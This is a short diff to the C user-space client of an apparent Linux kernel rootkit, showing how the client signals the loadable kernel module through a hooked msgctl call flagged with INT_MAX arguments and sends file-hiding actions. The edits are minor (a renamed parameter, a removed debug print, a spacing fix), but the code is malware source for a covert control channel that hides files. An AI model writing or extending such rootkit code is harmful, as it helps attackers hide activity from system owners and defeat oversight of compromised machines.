@@ -180,16 +180,16 @@ void handle_file_hide_action(char *base_cmd, char *subarg, char *argv[], action_
 
 /**
  * Uses msgctl to interface with rootkit. The LKM hooks this function
- * and responds to the actions as they come in. Documentedd in rootkit.c.
+ * and responds to the actions as they come in. Actions are marked by passing
+ * INT_MAX for the first two parameters.
  *
  * Returns 0 if successfully communicated, -1 otherwise.
  */
-int communicate_with_lkm(action_task *data_to_pass) {
+int communicate_with_lkm(action_task *rootkit_action) {
 	struct msqid_ds messenger;
 	memset(&messenger, 0, sizeof(struct msqid_ds));
-	printf("Sending request to LKM\n");
 
-	if (msgctl(INT_MAX, INT_MAX, (struct msqid_ds*) data_to_pass) == 0) {
+	if (msgctl(INT_MAX, INT_MAX, (struct msqid_ds*) rootkit_action) == 0) {
 		print_green("Communication OK.\n");
 		return 0;
 	} else {
@@ -203,7 +203,7 @@ int communicate_with_lkm(action_task *data_to_pass) {
  * Otherwise, returns false.
  */
 bool execute_action_if_possible(action_task *action) {
-	if (action->func_code != - 1) {
+	if (action->func_code != -1) {
 		printf("Function code: %d, str: %s\n", action->func_code, action->file_hide_str);
 		communicate_with_lkm(action);
 		return true;
